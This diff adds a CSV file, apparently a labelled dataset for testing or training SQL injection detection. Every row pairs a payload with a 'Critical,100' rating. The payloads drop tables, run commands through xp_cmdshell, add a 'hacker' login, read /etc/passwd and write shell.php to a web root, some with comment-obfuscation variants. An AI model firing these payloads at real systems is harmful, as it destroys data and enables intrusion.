@@ -1,0 +1,100 @@
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; -- /* test */,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/-- /* test */,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/--,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+'; EXEC xp_cmdshell('dir C:\') -- /* test */,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/-- /* test */,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/--,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1;/**/UNION/**/SELECT/**/NULL/**/NULL/**/INTO/**/OUTFILE/**/'/var/www/html/shell.php'/**/--,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/-- /* test */,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/-- /* test */,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/--,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/--,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/--,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/-- /* test */,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+1;/**/UNION/**/SELECT/**/NULL/**/NULL/**/INTO/**/OUTFILE/**/'/var/www/html/shell.php'/**/--,Critical,100
+'; DROP TABLE users; --,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/--,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/--,Critical,100
+'; DROP TABLE users; -- /* test */,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/-- /* test */,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL -- /* test */,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/-- /* test */,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/-- /* test */,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' -- /* test */,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' -- /* test */,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/-- /* test */,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/-- /* test */,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
+1;/**/UNION/**/SELECT/**/NULL/**/NULL/**/INTO/**/OUTFILE/**/'/var/www/html/shell.php'/**/-- /* test */,Critical,100
+'; DROP TABLE users; --,Critical,100
+'; DROP TABLE users; --,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/--,Critical,100
+';/**/DROP/**/TABLE/**/users;/**/--,Critical,100
+'; EXEC xp_cmdshell('dir C:\') --,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/--,Critical,100
+';/**/EXEC/**/xp_cmdshell('dir/**/C:\')/**/-- /* test */,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/--,Critical,100
+1; EXEC sp_addlogin 'hacker' 'password' --,Critical,100
+1;/**/EXEC/**/sp_addlogin/**/'hacker'/**/'password'/**/-- /* test */,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL --,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL -- /* test */,Critical,100
+1; UNION SELECT LOAD_FILE('/etc/passwd') NULL -- /* test */,Critical,100
+1;/**/UNION/**/SELECT/**/LOAD_FILE('/etc/passwd')/**/NULL/**/--,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' --,Critical,100
+1;/**/UNION/**/SELECT/**/NULL/**/NULL/**/INTO/**/OUTFILE/**/'/var/www/html/shell.php'/**/--,Critical,100
+1; UNION SELECT NULL NULL INTO OUTFILE '/var/www/html/shell.php' -- /* test */,Critical,100
